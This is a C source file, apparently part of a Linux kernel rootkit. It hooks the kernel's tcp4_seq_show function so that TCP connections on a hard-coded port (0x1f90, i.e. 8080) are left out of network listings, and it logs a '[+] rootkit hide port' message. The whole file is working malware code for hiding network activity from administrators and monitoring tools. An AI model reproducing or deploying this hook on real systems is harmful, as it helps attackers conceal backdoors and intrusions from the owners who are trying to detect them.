#include "tcp4_seq_show.h"
#include "linux/seq_file.h"

// TODO: Customizable ports/defaults
#define HIDE_PORT 0x1f90

extern asmlinkage int (*orig_tcp4_seq_show)(struct seq_file* seq, void* v);

asmlinkage int hook_tcp4_seq_show(struct seq_file* seq, void* v)
{
  struct sock* sk = v;

  // if its the first print or struct has our port in it
  if ((v != SEQ_START_TOKEN) &&
      (sk->__sk_common.skc_num == HIDE_PORT || sk->__sk_common.skc_dport == HIDE_PORT)) {
    printk(KERN_INFO "[+] rootkit hide port in tcp4_seq_show\n");
    return 0;
  }

  return orig_tcp4_seq_show(seq, v);
}
